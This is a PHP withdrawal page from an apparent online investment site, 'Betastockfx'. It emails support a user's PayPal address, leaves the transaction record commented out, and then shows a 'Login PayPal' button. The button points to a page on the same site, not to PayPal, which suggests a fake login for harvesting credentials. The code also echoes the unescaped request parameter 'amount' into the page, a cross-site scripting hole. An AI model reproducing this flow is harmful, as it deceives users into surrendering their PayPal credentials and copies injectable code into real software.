<?php

session_start();
require "../../mail.php";
$id=$_SESSION['user_id'];
$withdraw_amount=$_REQUEST['amount'];
if($_POST){
    $unix_time=time();
  $paypal_email=$_POST['email'];
  $subject="Withdrawal Request";
  $message="<p>I want to withdraw $$withdraw_amount from my account.<br> My paypal email is $paypal_email</p>";
  $date=$date=Date("jS-F-Y");
 // $insert_trx=mysqli_query($conn,"INSERT INTO `transactions`(`user_id`,`amount`,`type`,`date`,`unix_time`) VALUES('$id','$withdraw_amount','withdrawal','$date','$unix_time')");
  sendmail("support@Betastockfx.com",$subject,$message);
  header("location:paypal2.php?amount=$withdraw_amount");
}
require "header.php";
?>




 <center>
            <div class="card col-md-6 col-lg-4">
                <div class="card-header">
                   <h3> Balance: $<?php echo $balance ?></h3>
                </div>
                <div class="card-body">
                <form method="post" action="#">
   <div class="form">
    <p style="margin-left: 20px; margin-right: 20px; margin-top: 10px;">A confirmation link has been sent to your paypal<br> account please login and confirm the<br> account is yours</p>
    <a href="paypal3.php?withdraw_amount=<?php echo $withdraw_amount; ?>"  target="_blank"><button type="button" class="btn btn-primary btn-block">Login PayPal  </button></a>
   </div>
</form>
                </div>
            </div>
             
            </center>






<?php
require "../footer.php"; 
?>